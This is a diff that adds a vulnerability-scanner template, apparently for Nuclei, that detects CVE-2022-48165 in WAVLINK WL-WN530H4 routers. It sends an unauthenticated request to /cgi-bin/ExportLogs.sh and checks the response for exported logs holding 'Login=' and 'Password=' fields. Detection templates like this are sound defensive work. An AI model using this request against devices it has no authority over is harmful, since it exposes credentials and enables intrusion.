@@ -1,0 +1,28 @@
+id: wavlink-improper-access-control
+
+info:
+  name: WAVLINK WL-WN530H4 Unauthorized Access Vulnerability (CVE-2022-48165)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve,cve-2022-48165,unauthorized-access
+  description: |
+    WAVLINK WL-WN530H4 devices are vulnerable to an improper access control issue allowing unauthorized access to sensitive logs.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/ExportLogs.sh"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Login="
+          - "Password="
+        part: body
+      - type: regex
+        regex:
+          - "filename=\\\"sysLogs\\.txt\\\""
+        part: header
